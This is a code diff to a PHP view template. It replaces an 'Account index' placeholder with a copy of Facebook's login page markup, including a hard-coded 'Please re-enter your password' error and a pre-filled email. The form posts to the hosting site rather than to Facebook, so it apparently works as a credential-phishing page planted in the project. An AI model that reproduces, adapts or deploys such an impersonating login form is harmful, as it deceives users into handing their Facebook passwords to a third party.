@@ -1,1 +1,76 @@
-<?php echo 'Account index' ?>
+ <div class="UIFullPage_Container">
+	<div
+		class="mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite">
+		<div
+			class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
+			<div class="clearfix uiHeaderTop">
+				<div class="rfloat">
+					<h2 class="accessible_elem">Facebook Login</h2>
+					<div class="uiHeaderActions"></div>
+				</div>
+				<div>
+					<h2 aria-hidden="true" class="uiHeaderTitle">Facebook Login</h2>
+				</div>
+			</div>
+		</div>
+		<div class="phl ptm uiInterstitialContent">
+			<div class="login_form_container">
+				<form id="login_form">
+					<input type="hidden" autocomplete="off" value="AVrtGsrI" name="lsd">
+					<div class="pam login_error_box uiBoxRed">
+						<div class="fsl fwb fcb">Please re-enter your password</div>
+						<div>
+							<p>The password you entered is incorrect. Please try again (make
+								sure your caps lock is off).</p>
+							<p>
+								Forgot your password? <a target=""
+									href="/recover.php?email_or_phone=bsadfsdf">Request a new one.</a>
+							</p>
+						</div>
+					</div>
+					<div id="loginform">
+						<div class="form_row clearfix">
+							<label class="login_form_label" for="email">Email or Phone:</label>
+							<input type="text" value="bsadfsdf" name="email" id="email"
+								class="inputtext">
+						</div>
+						<div class="form_row clearfix">
+							<label class="login_form_label" for="pass">Password:</label> <input
+								type="password" class="inputpassword" id="pass" name="pass">
+						</div>
+						<div class="persistent">
+							<div class="uiInputLabel clearfix">
+								<input type="checkbox" class="uiInputLabelCheckbox"
+									name="persistent" value="1" id="persist_box"><label
+									for="persist_box">Keep me logged in</label>
+							</div>
+						</div>
+						<input type="hidden" value="0" name="default_persistent"
+							id="default_persistent" autocomplete="off">
+						<div class="form_row clearfix" id="buttons">
+							<label class="login_form_label"></label>
+							<div id="login_button_inline">
+								<label for="ue6h2v22" id="loginbutton"
+									class="uiButton uiButtonConfirm uiButtonLarge"><input
+									type="submit" id="ue6h2v22" name="login" value="Log In"></label>
+							</div>
+							<div id="register_link">
+								or <strong><a tabindex="-1" id="reg_btn_link" rel="nofollow"
+									target="_self"
+									href="http://www.facebook.com/r.php?next=&amp;locale=en_US">Sign
+										up for Facebook</a></strong>
+							</div>
+						</div>
+						<p class="reset_password form_row">
+							<a tabindex="-1" target=""
+								href="http://www.facebook.com/recover/initiate">Forgot your
+								password?</a>
+						</p>
+					</div>
+				</form>
+			</div>
+		</div>
+	</div>
+</div>
+<!-- Languages -->
+<?php echo $this->render('layout/languages.phtml') ?>	
